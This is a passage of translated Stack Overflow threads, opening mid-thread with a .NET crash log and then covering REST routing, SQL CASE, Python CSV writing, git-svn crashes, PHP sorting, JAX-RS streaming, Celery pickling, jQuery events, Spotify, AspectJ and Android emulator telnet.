Faulting process id: 0xf18
Faulting application start time: 0x01ce3c6ce70ee3f8
Faulting application path: C:\Users\My_User\AppData\Local\Apps\2.0\VJ12169A.3AG\6445EVK6.26Y\wmsd..tion_9fb3931a66281a0b_0004.0000_68586becb8f48f17\CompanyProductManager.exe
Faulting module path: C:\Windows\system32\KERNELBASE.dll
Report Id: 2588c97b-a860-11e2-be7c-3cd92b4a0af4 
```

* * *

*源“.NET 运行时”的第二个错误*

```
Application: CompanyProductManager.exe
Framework Version: v4.0.30319
Description: The process was terminated due to an unhandled exception.
Exception Info: System.IO.FileLoadException
Stack:
   at CompanySI.CompanyProduct.CompanyProductManager.App.OnStartup(System.Windows.StartupEventArgs)
   at System.Windows.Application.<.ctor>b__1(System.Object)
   at System.Windows.Threading.ExceptionWrapper.InternalRealCall(System.Delegate, System.Object, Int32)
   at MS.Internal.Threading.ExceptionFilterHelper.TryCatchWhen(System.Object, System.Delegate, System.Object, Int32, System.Delegate)
   at System.Windows.Threading.DispatcherOperation.InvokeImpl()
   at System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)
   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)
   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object)
   at System.Windows.Threading.DispatcherOperation.Invoke()
   at System.Windows.Threading.Dispatcher.ProcessQueue()
   at System.Windows.Threading.Dispatcher.WndProcHook(IntPtr, Int32, IntPtr, IntPtr, Boolean ByRef)
   at MS.Win32.HwndWrapper.WndProc(IntPtr, Int32, IntPtr, IntPtr, Boolean ByRef)
   at MS.Win32.HwndSubclass.DispatcherCallbackOperation(System.Object)
   at System.Windows.Threading.ExceptionWrapper.InternalRealCall(System.Delegate, System.Object, Int32)
   at MS.Internal.Threading.ExceptionFilterHelper.TryCatchWhen(System.Object, System.Delegate, System.Object, Int32, System.Delegate)
   at System.Windows.Threading.Dispatcher.LegacyInvokeImpl(System.Windows.Threading.DispatcherPriority, System.TimeSpan, System.Delegate, System.Object, Int32)
   at MS.Win32.HwndSubclass.SubclassWndProc(IntPtr, Int32, IntPtr, IntPtr)
   at MS.Win32.UnsafeNativeMethods.DispatchMessage(System.Windows.Interop.MSG ByRef)
   at MS.Win32.UnsafeNativeMethods.DispatchMessage(System.Windows.Interop.MSG ByRef)
   at System.Windows.Threading.Dispatcher.PushFrameImpl(System.Windows.Threading.DispatcherFrame)
   at System.Windows.Application.RunInternal(System.Windows.Window)
   at System.Windows.Application.Run()
   at CompanySI.CompanyProduct.CompanyProductManager.App.Main() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-01T14:47:09.287

在未启用验证跳过的机器上加载延迟签名的程序集可能会导致类似的错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:30:05.673

只是一个猜测，但我已经看到一个损坏的 user.config 文件以前使用另一个应用程序执行过类似的操作。那是前一段时间了，我不记得到底抛出了什么异常。检查您是否在 AppData 目录（或其他地方）中有一个并将其删除。

# rest - 如何在 RESTful ASP.NET Web API 中路由非 CRUD 操作？

> ID：16091947
> 
> 赞同：14
> 
> 时间：2013-04-18T19:56:55.803
> 
> 标签：rest, asp.net-web-api

我正在尝试使用 ASP.NET Web API 为我们的服务设计一个 RESTful Web API。我在弄清楚如何将非 CRUD 操作路由到正确的控制器操作时遇到了麻烦。假设我的资源是一扇门。我可以用我的门做所有熟悉的 CRUD 事情。假设我的门的模型是：

```
public class Door
{
   public long Id { get; set; }
   public string InsideRoomName { get; set; }
   public string OutsideRoomName { get; set; }
} 
```

我可以通过我的 web api 完成所有标准的 CRUD 操作：

```
POST: http://api.contoso.com/v1/doors
GET: http://api.contoso.com/v1/doors
GET: http://api.contoso.com/v1/doors/1234
GET: http://api.contoso.com/v1/doors?InsideRoomName=Cafeteria
PUT: http://api.contoso.com/v1/doors/1234
DELETE: http://api.contoso.com/v1/doors/1234 
```

等等。我遇到麻烦的地方是当我需要对我的门进行非 CRUD 操作建模时。我想对我的资源建模一个 Lock 和 Unlock 动词。阅读[ASP.NET 文章](http://www.asp.net/web-api/overview/web-api-routing-and-actions/routing-in-aspnet-web-api)，该指南似乎是在使用自定义操作时切换到 RPC 样式调用。这给了我一条路径：

```
PUT: http://api.contoso.com/v1/doors/1234/lock
PUT: http://api.contoso.com/v1/doors/1234/unlock 
```

这似乎与旨在指示资源的路径的 REST 精神相冲突。我想我可以将动词建模为资源：

```
POST: http://api.contoso.com/v1/doors/1234/lockrequests
POST: http://api.contoso.com/v1/doors/1234/unlockrequests 
```

在这种情况下，我仍然可以使用推荐的 {controller}/{id}/{action} 但似乎我仍在创建混合 RPC / REST API。就 REST 接口而言，是否有可能，甚至推荐将自定义操作放在参数列表中？

```
PUT: http://api.contoso.com/v1/doors/1234?lock
PUT: http://api.contoso.com/v1/doors/1234?unlock 
```

**我可以预见需要使用查询参数支持此调用，例如：**

```
PUT: http://api.contoso.com/v1/doors?lock&InsideRoomName=Cafeteria 
```

**我将如何创建将这个请求映射到我的 DoorsController 的路由？**

```
public class DoorsController : ApiController
{
   public IEnumerable<Doord> Get();
   public Door Get(long id);
   public void Put(long id, Door door);
   public void Post(Door door);
   public void Delete(long id);

   public void Lock(long id);
   public void Unlock(long id);
   public void Lock(string InsideRoomName);
} 
```

关于 REST API 设计方面什么是最佳实践，什么不是最佳实践，我可能在这里做出了一些错误的假设，因此也欢迎任何指导。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-18T20:07:43.253

To handle the `lock/unlock` scenario you could consider adding a `State` property to the `Door` object:

```
 public State State { get; set; } 
```

where State is an enum of available values, e.g.

```
{
LockedFromOutsideRoom,
LockedFromInsideRoom,
Open
} 
```

To clarify: That you're adding a state to the object is not against restful principles as the state is passed over the api every time you make a call to do something with the Door.

Then via the api you would send a `PUT/POST` request to change the state of the Door on each lock/unlock. Post would probably be better as it's only one property that gets updated:

```
POST: http://api.contoso.com/v1/doors/1234/state
body: {"State":"LockedFromInsideRoom"} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-06-20T09:15:53.503

从 RESTful 原则来看，也许最好引入一个“状态”属性来管理那些非 CURD 操作。但我认为它不符合真正的生产发展。

对这类问题的每一个答案，看起来您都必须使用变通方法来强制您的 API 设计符合 RESTful。但我担心的是，这真的给用户和开发者都带来了便利吗？

让我们看一下 Google bloger 的 API3.0 设计：[https](https://developers.google.com/blogger/docs/3.0/reference) ://developers.google.com/blogger/docs/3.0/reference ，它使用 lot URL 进行非 CURD 操作。

这很有趣，

```
POST  /blogs/blogId/posts/postId/comments/commentId/spam 
```

描述是

> 将评论标记为垃圾邮件。这会将评论的状态设置为垃圾邮件，并将其隐藏在默认的评论呈现中。

您可以看到，评论具有指示它是否为垃圾邮件的状态，但它的设计不像 JoannaTurban 上面提到的答案。

我认为从用户的角度来看，它更方便。不需要关心“状态”的结构和枚举值。实际上你可以在“状态”的定义中加入很多属性，比如“isItSpam”、“isItReplied”、“isItPublic”等。如果状态有很多东西，设计就会变得不友好。

在某些业务逻辑要求上，使用易于理解的动词，而不是试图使其完全成为“真正的”RESTful，它对用户和开发人员来说都更有效率。这是我的意见。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T20:13:30.730

从 REST 的角度来看，您可能希望将锁本身视为一种资源。通过这种方式，您可以独立于门创建和删除锁（尽管可能从门表示中定位锁端点）。资源的 URL 可能与门的 URL 相关，但是从 RESTful 的角度来看，这无关紧要。REST 是关于资源之间的关系，所以重要的部分是锁的 url 可以从门的表示中发现。

# sql-server - SQL Server：根据其他列数据将数据从一列分成两列

> ID：16091948
> 
> 赞同：0
> 
> 时间：2013-04-18T19:56:56.397
> 
> 标签：sql-server

我有 SQL Server 2012 并想创建一个执行以下操作的视图：

我的桌子有：

```
MovType | Qty
In      | 200
Out     | 10 
```

现在我想创建一个基本上遍历整个表的视图，并取决于`MovType`是`In`或`Out`分配给一个特殊的动态列。

所以基本上我需要：

```
InQty | OutQty
200   | 0
  0   | 10 
```

我知道这可以用 来完成`CASE`，但不确定代码。其次，速度是一个重要因素，那么有没有什么特别的方法可以以最少的开销做到这一点？

提前感谢大家！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:02:36.787

是的，你可以使用`CASE`，它应该是有效的。case 语句不需要像 a 那样从磁盘读取`JOIN`，它是一个非常简单的命令，不太可能导致性能问题。

```
SELECT CASE WHEN MovType='In' THEN Qty Else 0 End AS InQty,
       CASE WHEN MovType='Out' THEN Qty Else 0 End AS OutQty
FROM dbo.Table1 
```

[http://sqlfiddle.com/#!6/d507f/3/0](http://sqlfiddle.com/#!6/d507f/3/0)

# python - 如何分隔csv文件的行

> ID：16091952
> 
> 赞同：0
> 
> 时间：2013-04-18T19:57:04.583
> 
> 标签：python, python-2.7, csv, export-to-csv

我在重写 CSV 文件时遇到问题。我所拥有的是一个包含 20 列的 CSV 文件，我将其重写为只有 5 列。现在，我需要删除一些不必要的点，其中 SN < 20。它有效，唯一的问题是它没有将行。它将所有内容都放在第 1 行。我猜它来自，

```
output_ary.append(row) 
```

但我不知道那里还能写什么。这是代码的一部分：

```
import csv
import os
import matplotlib.pyplot as plt

os.chdir("C:\Users\Robert\Documents\qwe")

r = csv.reader(open("gdweights_feh_robert_cmr.csv",'rU'))

w = csv.writer(open("gdweight.csv",'wb',buffering=0))

zerovar2 = 0
for row in r:
        if zerovar2==0:
        zerovar2 = zerovar2 + 1
    else:
                sn = float(row[11])
                rweight = float(row[17])
                tarweight = float(row[18])
                fehadop = float(row[25])
                weight = rweight*tarweight*fehadop
                w.writerow([sn,rweight,tarweight,fehadop,weight])

output_ary = []

with open("gdweight.csv",'rU') as f:
    reader = csv.reader(f, delimiter= ',')
    zerovar = 0
    for row in reader:
        if zerovar==0:
                zerovar = zerovar + 1
        else:
                sn = row [0]
                zerovar = zerovar + 1
                x = float(sn)
                if x > 20:
                    output_ary.append(row)

with open("ouput1.csv",'w') as f2:
    for row in output_ary:
        for item in row:
            f2.write(item + ",") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:02:47.473

```
with open("ouput1.csv",'w') as f2:
    for row in output_ary:
        for item in row:
            f2.write(item + ",")
        f2.write("\n") # this is what you're missing 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:03:07.057

简单地将最后一个重写为：

```
with open("ouput1.csv",'w') as f2:
    for row in output_ary:
        f2.write(",".join([str(e) for e in item] + '\n') 
```

现在这里有一些额外的评论：

您可以使用 enumerate 而不是使用计数器：

```
for i_row, row in enumerate(r) :
    ... 
```

您还可以使用 csv 编写器：

```
with open("output.txt", "w") as f :
    csv_w = csv.writer(f)
    for i_row, row in enumerate(output) : 
        if i_row== 0 :
            continue
        csv_w.writerow(row) 
```

# git-svn - 如何在克隆期间修复“git-svn 死于信号 6”？

> ID：16091953
> 
> 赞同：5
> 
> 时间：2013-04-18T19:57:10.820
> 
> 标签：git-svn, osx-mountain-lion

我正在尝试克隆一个新的 SVN 存储库，其中仅包含主干/分支/标签，但它失败了，信息相对较少：

```
git svn clone --stdlayout https://mydomain.com/svn/myrepo
Initialized empty Git repository in /Users/datguy/myrepo/.git/
Authentication realm: <https://mydomain.com> (null)
Password for 'datguy': 
error: git-svn died of signal 6 
```

我以为我使用的是 OSX 10.8.3 附带的默认版本的 git & svn，但我注意到以下两个命令报告的 svn 版本不同：

```
$ git svn --version
git-svn version 1.7.10.2 (Apple Git-33) (svn 1.6.18)

$ svn --version
svn, version 1.7.7 (r1393599) 
```

`/usr/local/bin/svn`我显然用自制软件（在）安装了更新版本的 svn 。我可以使用 svn 处理这个存储库，包括导入、签出等。我如何找出 git-svn 出了什么问题，或者更新 svn 绑定？

**编辑**- 我深入控制台并找到了这个 perl 崩溃报告。不幸的是，我没有足够的经验阅读这些报告，无法知道它想告诉我什么。

```
Process:         perl5.12 [13309]
Path:            /usr/bin/perl5.12
Identifier:      perl5.12
Version:         77.2
Code Type:       X86-64 (Native)
Parent Process:  git [13308]
User ID:         501

PlugIn Path:       /Library/Perl/5.12/darwin-thread-multi-2level/auto/SVN/_Ra/_Ra.bundle
PlugIn Identifier: _Ra.bundle
PlugIn Version:    ??? (52)

Date/Time:       2013-04-18 15:20:16.512 -0400
OS Version:      Mac OS X 10.8.3 (12D78)
Report Version:  10

Crashed Thread:  0  Dispatch queue: com.apple.main-thread

Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x0000000000000000, 0x0000000000000000

Application Specific Information:
__abort() called

Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
0   libsystem_kernel.dylib          0x00007fff977d0d46 __kill + 10
1   libsystem_c.dylib               0x00007fff968b6ec0 __abort + 193
2   libsystem_c.dylib               0x00007fff9687877d __chk_fail + 35
3   libsystem_c.dylib               0x00007fff968787f0 __memset_chk + 41
4   libneon.27.dylib                0x000000010e0b2cf1 ne__ntlm_authenticate + 1018
5   libneon.27.dylib                0x000000010e0b1455 ntlm_challenge + 171
6   libneon.27.dylib                0x000000010e0afd17 ah_post_send + 1400
7   libneon.27.dylib                0x000000010e0a8a10 ne_end_request + 100
8   libneon.27.dylib                0x000000010e0a8bbc ne_request_dispatch + 70
9   libsvn_ra_neon-1.0.0.0.dylib    0x000000010e0729fd svn_ra_neon__request_dispatch + 404
10  libsvn_ra_neon-1.0.0.0.dylib    0x000000010e06d357 svn_ra_neon__exchange_capabilities + 186
11  libsvn_ra_neon-1.0.0.0.dylib    0x000000010e071156 0x10e063000 + 57686
12  libsvn_ra-1.0.0.0.dylib         0x000000010df4d096 svn_ra_open3 + 1170
13  libsvn_ra-1.0.0.0.dylib         0x000000010df4c483 svn_ra_open + 175
14  _Ra.bundle                      0x000000010e0db65b _wrap_svn_ra_open + 675
15  libperl.dylib                   0x000000010dc36abd Perl_pp_entersub + 2456
16  libperl.dylib                   0x000000010dc2eee1 Perl_runops_standard + 38
17  libperl.dylib                   0x000000010dbdff26 perl_run + 453
18  perl5.12                        0x000000010dbc5d54 main + 221
19  libdyld.dylib                   0x00007fff9685b7e1 start + 1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T15:08:48.463

感谢[这个问答](https://stackoverflow.com/q/16115883/980607)，我学会了如何更新`SVN::Core`perl 模块。之后，我能够克隆 svn 存储库。

# php - 在数组变量中按值的降序显示结果

> ID：16091959
> 
> 赞同：0
> 
> 时间：2013-04-18T19:57:26.880
> 
> 标签：php, mysql, arrays, sorting

嗨，我想知道是否有人可以帮助我。我创建了一份问卷，问卷中有多个结果（显示为%）。我能够在 results.php 页面上显示这些结果，以及相应的名称 ($careername) 和相应的链接 ($link)。例如，我有 5 个结果，每个结果都链接到相应的职业和链接，这些结果显示在 results.php 页面上。但是我需要结果、职业名称和链接以结果值的降序显示。截至目前，它们以随机顺序显示。以下是我正在使用的代码，如果有人有任何想法，我将不胜感激。

```
<?php
$careername1 = 'Nursing '; 
$careername2 = 'Footballer ';
$careername3 = 'Dentist ';
$careername4 = 'Hairdressing ';
$careername5 = 'IT ';
?>

<?php
$link1 = '<br><a href="http://www.nhscareers.nhs.uk/explore-by-career/nursing/" target="_blank">More information on Nursing</a></br></br>';
$link2 = '<br><a href="#" target="_blank">More information on Footballing</a></br>  </br>';
$link3 = '<br><a href="#" target="_blank">More information on Dentistry</a></br></br>';
$link4 = '<br><a href="#" target="_blank">More information on Hairdressing</a></br></br>';
$link5 = '<br><a href="#" target="_blank">More information on IT</a></br></br>';
?>
<?php
$nursing = array($careername1, $result1, "% ", $link1);
$footballer = array($careername2, $result2, "% ", $link2);
$dentist = array($careername3, $result3, "% ", $link3);
$hairdresser = array($careername4, $result4, "% ", $link4);
$IT = array($careername5, $result5, "% ", $link5);
?>
<h1>Your results are listed below:</h1>

<?php
$items = array("$nursing", "$footballer", "$dentist", "$hairdresser", "$IT");
arsort($items);
foreach ($items as $key => $val) {
echo "$key = $val\n";
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:00:54.220

```
// some test values
$nursing = array("nursing", 5, "% ", "");
$footballer = array("footballer", 15, "% ","");
$dentist = array("dentist", 25, "% ", "");
$hairdresser = array("hairdresser", 0, "% ", "");
$IT = array("IT", 50, "% ", "");

$items = array($nursing, $footballer, $dentist, $hairdresser, $IT);

foreach ($items as $item) {
 echo $item[1].'->'.$item[0].'<br>';;
} 
```

输出未排序

```
5->nursing
15->footballer
25->dentist
0->hairdresser
50->IT 
```

按索引 1 降序排序

```
function compare($a, $b) {
    if ($a[1] == $b[1]) {
        return 0;
    }
    return ($a[1] < $b[1]) ? -1 : 1;
}

usort($items, 'compare');

foreach ($items as $item) {
  echo $item[1].'->'.$item[0].'<br>';;
} 
```

输出排序

```
0->hairdresser
5->nursing
15->footballer
25->dentist
50->IT 
```

[http://www.php.net/manual/fr/function.usort.php](http://www.php.net/manual/fr/function.usort.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:00:14.470

```
$items = array("$nursing", "$footballer", "$dentist", "$hairdresser", "$IT"); 
```

注意`"$nursing"`应该是`$nursing` 等。

```
$items = array($nursing, $footballer,$dentist, $hairdresser,$IT); 
```

如果这不起作用，您可能需要编写`compare`自己的函数并将其用作`arsort`函数的第二个参数。

如需更多信息，请阅读[http://php.net/manual/en/function.arsort.php](http://php.net/manual/en/function.arsort.php)

（*编写一个比较函数并不像看起来那么困难）

# java - 如何使用 JAX-RS 流式传输无尽的 InputStream

> ID：16091961
> 
> 赞同：9
> 
> 时间：2013-04-18T19:57:49.163
> 
> 标签：java, jersey, jax-rs

我有`InputStream`一些数据无穷无尽，我想返回这些数据以响应`GET`HTTP 请求。我希望我的 Web/API 客户端可以无休止地读取它。我怎样才能用 JAX-RS 做到这一点？我正在尝试这个：

```
@GET
@Path("/stream")
@Produces(MediaType.TEXT_PLAIN)
public StreamingOutput stream() {
    final InputStream input = // get it
    return new StreamingOutput() {
        @Override
        public void write(OutputStream out) throws IOException {
            while (true) {
                out.write(input.read());
                out.flush();
            }
        }
    };
} 
```

但是内容不会出现在客户面前。但是，如果我添加`OutputStream#close()`，服务器会在那个时候提供内容。我怎样才能使它真正可流式传输？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-27T03:39:47.440

因此，您有刷新问题，您可以尝试按照规范获取 ServletResponse：

> @Context 注释可用于指示对 Servlet 定义的资源的依赖。基于 Servlet 的实现必须支持以下 Servlet 定义的类型的注入：ServletConfig、ServletContext、HttpServletRequest 和 HttpServletResponse。
> 
> 注入的 HttpServletResponse 允许资源方法在返回之前提交 HTTP 响应。实现必须检查已提交状态，并且仅在响应尚未提交时才处理返回值。

然后冲洗所有可以冲洗的东西，如下所示：

```
@Context
private HttpServletResponse context;

@GET
@Path("/stream")
@Produces(MediaType.TEXT_PLAIN)
public String stream() {
    final InputStream input = // get it
    ServletOutputStream out = context.getOutputStream();
            while (true) {
                out.write(input.read());
                out.flush();
                context.flushBuffer();
            }
    return "";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-08-26T21:23:10.503

只需使用 JAX-RS 的 StreamingOutput

```
@Path("/numbers")
public class NumbersResource {

    @GET
    public Response streamExample(){
        StreamingOutput stream = new StreamingOutput() {
            @Override
            public void write(OutputStream out) throws IOException, WebApplicationException {
                Writer writer = new BufferedWriter(new OutputStreamWriter(out));
                for (int i = 0; i < 10000000 ; i++){
                    writer.write(i + " ");
                }
                writer.flush();
            }
        };
        return Response.ok(stream).build();
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-26T00:19:15.990

只是一个疯狂的猜测：

```
@GET
@Path("/stream")
@Produces(MediaType.TEXT_PLAIN)
public Response stream() {
    final InputStream input = getit();
    return Response.ok(input, MediaType.TEXT_PLAIN_TYPE).build();        
} 
```

# python - 不能腌制：属性查找 builtin.function 失败

> ID：16091963
> 
> 赞同：6
> 
> 时间：2013-04-18T19:57:56.103
> 
> 标签：python, django, django-celery

我收到以下错误，该错误仅在我添加`delay`到 `process_upload`函数时发生，否则它可以正常工作。

**有人可以解释这个错误是什么，为什么会发生以及有什么解决建议吗？**

**错误：**

```
PicklingError at /contacts/upload/configurator/47/
  Can't pickle <type 'function'>: attribute lookup __builtin__.function failed 
```

**这是视图**

```
 if request.method == 'POST':
        form = ConfiguratorForm(data=request.POST)
        # Send import to task.
        process_upload.delay(upload_id=upload.id, form=form) 
```

**这是任务**

```
@task
def process_upload(upload_id, form):
    upload = Upload.objects.get(id=upload_id)
    upload.process(form=form) 
```

**Upload.process 在我的模型中：**

```
 def process(self, form):
        self.date_start_processing = timezone.now()
            import_this(data=self.filepath, extra_fields=[
                {'value': self.group_id, 'position': 5},
                {'value': self.uploaded_by.id, 'position': 6}], form=form) 
```

**完整跟踪：**

```
Traceback:
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/django/core/handlers/base.py" in get_response
  115\.                         response = callback(request, *callback_args, **callback_kwargs)
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/django/contrib/auth/decorators.py" in _wrapped_view
  25\.                 return view_func(request, *args, **kwargs)
File "/Users/user/Documents/workspace/sms/contacts/views.py" in upload_configurator
  118\.         process_upload.delay(upload_id=upload.id, form=form)
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/celery/app/task.py" in delay
  357\.         return self.apply_async(args, kwargs)
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/celery/app/task.py" in apply_async
  472\.                                      **options)
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/celery/app/amqp.py" in publish_task
  249\.             **kwargs
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/kombu/messaging.py" in publish
  157\.             compression, headers)
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/kombu/messaging.py" in _prepare
  233\.              body) = encode(body, serializer=serializer)
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/kombu/serialization.py" in encode
  161\.         payload = encoder(data)
File "/Users/user/Documents/workspace/sms/django-env/lib/python2.7/site-packages/kombu/serialization.py" in dumps
  340\.         return dumper(obj, protocol=pickle_protocol)

Exception Type: PicklingError at /contacts/upload/configurator/47/
Exception Value: Can't pickle <type 'function'>: attribute lookup __builtin__.function failed 
```

表格.py

```
COL_CHOICES = [
    ('N/A', 'No Import'),
    ('first_name', 'First Name'),
    ('last_name', 'Last Name'),
    ('company', 'Company'),
    ('mobile', 'Mobile Number'),
    ('email', 'Email Address'),
    ]

class ConfiguratorForm(forms.Form):
    col1 = forms.TypedChoiceField(choices=COL_CHOICES, initial='first_name')
    col2 = forms.TypedChoiceField(choices=COL_CHOICES, initial='first_name')
    col3 = forms.TypedChoiceField(choices=COL_CHOICES, initial='first_name')
    col4 = forms.TypedChoiceField(choices=COL_CHOICES, initial='first_name') 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-18T20:23:43.020

您没有提供 ConfiguratorForm 的定义，但无论如何：异步执行要求您的任务的参数是可挑选的，显然您的表单不是。你可能会走上艰难的道路，让它变得可挑剔，但这只是浪费时间。简单的解决方案是不传递表单，只传递表单的数据（iow：request.POST.copy() 但我不确定 Querydict 是否可以选择） - 或者更好的是，首先验证表单并只传递表单的 clean_data ，因为处理无效表单没有意义。

# javascript - 在 jQuery 中使用 BIND 或 ON 函数的最佳实践

> ID：16091970
> 
> 赞同：4
> 
> 时间：2013-04-18T19:58:13.980
> 
> 标签：javascript, jquery, events, jquery-mobile, binding

最近 jQuery 团队开始推荐使用`on`而不是`bind`for 将事件绑定到 DOM。

我想知道它们之间是否有区别，使用该函数有什么好处，以及在我的代码中将所有 my 's 函数更改为's 函数`on`是否是一个很好的调用？`bind``on`

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-18T20:07:46.410

jQuery 项目正朝着将越来越多的功能放在更少的方法中，而不是为每个单独的事物使用单独的方法。

方法`bind`和都已被单个方法所取代`live`，您可以在其中使用不同类型的参数来确定该方法的作用。`delegate``on`

比较：

```
$(sel).bind(event, f);            =    $(sel).on(event, f);
$(sel).live(event, f);            =    $(document.body).on(event, sel, f);
$(sel).delegate(sel2, event, f)   =    $(sel).on(event, sel2, f); 
```

如果您正在使用`live`，则应该替换它，因为该方法的使用有点尴尬。此外，该`live`方法在 body 元素上创建了一个委托，您应该尝试将委托绑定到更近的范围。

如果您正在使用`bind`并且`delegate`立即更换它们并不恐慌`on`。您可以在新代码中以及在您编辑的代码中执行此操作，但这些方法不会在不久的将来消失。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T20:03:28.667

基本用例基本没有区别

```
 $( '#elementID' ).bind( 'click', function(){...} );
 $( '#elementID' ).on( 'click', function(){...} ); 
```

这两个功能相同..

**`.on()`也做事件委托，因此是首选。**

添加 .on() 的想法是创建一个统一的事件 API，而不是有多个函数来绑定事件；

> .on() 替换 .bind()、.live() 和 .delegate()。

并且截至 jquery 1.7 ..`.bind`只是一个别名`.on()`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-18T20:04:26.600

On 从现在和将来附加一个事件处理程序。绑定，但是仅在您设置事件时附加该事件。如果动态添加其他元素，则不会为这些元素触发 bind。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-18T20:02:46.023

`bind`只是可能会被删除的简写。来自 jQuery 的源代码：

```
...

bind: function( types, data, fn ) {
    return this.on( types, null, data, fn );
},

... 
```

您可以自己查看[源代码](http://code.jquery.com/jquery-latest.js)的介绍，以了解有关 jQuery 工作原理的很多信息。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-18T20:04:47.473

不同的是，`bind`绑定事件，`on`也可以绑定事件，但也可以管理事件委托。

[http://api.jquery.com/on/#direct-and-delegated-events](http://api.jquery.com/on/#direct-and-delegated-events)

如果您想更详细地检查这一点，请查看此博客文章：[http ://www.elijahmanor.com/2012/02/differences-between-jquery-bind-vs-live.html](http://www.elijahmanor.com/2012/02/differences-between-jquery-bind-vs-live.html)

# spotify - 大多数 SPArtistBrowse 的 firstPortrait 是 nil

> ID：16091973
> 
> 赞同：0
> 
> 时间：2013-04-18T19:58:19.427
> 
> 标签：spotify, cocoalibspotify-2.0

我正在搜索 Spotify 服务并接收该搜索的所有艺术家。然后我从我收到的艺术家对象中制作 SPArtistBrowse 对象，并希望使用 firstPortrait 属性作为艺术家的封面图像，问题是大多数 firstPortraits 是零。当我在 iOS 版 Spotify 应用程序上搜索艺术家时，他们会出现图片。如果 firstPortrait 为 nil，Spotify 应用程序是否会显示艺术家专辑的封面，还是我做错了什么？

示例：在我的应用程序中 firstPortrait 为 nil 且 Spotify 应用程序显示图片的艺术家是艺术家 HOFFMAESTRO。

这是我的实现的一个片段：

```
SPArtist *artist = (SPArtist*)[self.results objectAtIndex:indexPath.row];
SPArtistBrowse *artistBrowse = [SPArtistBrowse browseArtist:artist inSession:[SPSession sharedSession] type:SP_ARTISTBROWSE_FULL];            

[SPAsyncLoading waitUntilLoaded:artistBrowse
                        timeout:kSPAsyncLoadingDefaultTimeout
                           then:^(NSArray *loadedItems, NSArray *notLoadedItems){

     // mostly artistBrowse.firstPortrait is nil                                   
    [self fadeCoverImage:artistBrowse.firstPortrait forCell:cell];
}]; 
```

编辑：应该说在调用 fadeCoverImage:forCell: 时加载了 artistBrowse 对象。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T09:07:44.343

Spotify 中的许多艺术家都没有肖像。在这种情况下，官方客户会替换为专辑封面——事实上，HOFFMAESTRO 使用专辑封面作为图片。

当艺术家没有肖像图像时使用专辑封面图像是这里的标准做法。

# aop - 用 aspectj 捕获布尔 Object.equals(Object)

> ID：16091975
> 
> 赞同：1
> 
> 时间：2013-04-18T19:58:22.273
> 
> 标签：aop, aspectj

有没有办法用 AspectJ 捕捉 Object.equals(Object )？我试过了：

```
@Pointcut("execution (* *(..))") 
```

或者

```
@Pointcut("call (* *(..))") 
```

但什么也没发生。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-03T10:47:58.853

The first one would only work if you could weave the advice into your JRE/JDK classes. While JDK weaving is possible (I have done it before) it is non-trivial and beyond the scope of this answer. I assume you are an AspectJ beginner, so I would not go that way if I were you.

The second one works if the call to `Object.equals` is made explicitly from code controlled by you, i.e. by code you weave your aspect into. If the calls are made by JDK classes, you are back at option 1, JDK weaving. If the calls are made by your own code, you are fine. If they are made by 3rd party libraries, you can still use binary weaving, creating new versions of the 3rd party class files and creating replacement JARs for them. As an alternative, you can use LTW (load-time weaving) and weave them during class-loading.

# android - 如何建立与 Android 设备的 Telnet 连接？

> ID：16091976
> 
> 赞同：0
> 
> 时间：2013-04-18T19:58:25.770
> 
> 标签：android, ruby, telnet

我希望能够对 Android 设备进行 telnet 调用，以便为其提供与“[如何在 Android 模拟器中模拟 GPS 位置？](https://stackoverflow.com/a/2279827/31252) ”中的答案类似的地理位置。

我尝试在 Ruby 中使用[Net::Telnet](http://www.ruby-doc.org/stdlib-2.0/libdoc/net/telnet/rdoc/Net/Telnet.html)类，而这段代码似乎确实在这样做：

```
require 'net/telnet'     
telnet = Net::Telnet::new( "Host" => "localhost",
                           "Port" => 5554,
                           "Timeout" => 90 )
telnet.puts("geo fix -122.326 47.633") 
```

我没有收到任何错误，但应用程序没有获取位置。

当我在终端中运行它时，我不会关闭会话，那么如何通过 Ruby 执行相同的操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T04:16:12.637

当您手动 telnet 时，在尝试输入命令后按回车键，您需要在命令中添加换行符。

```
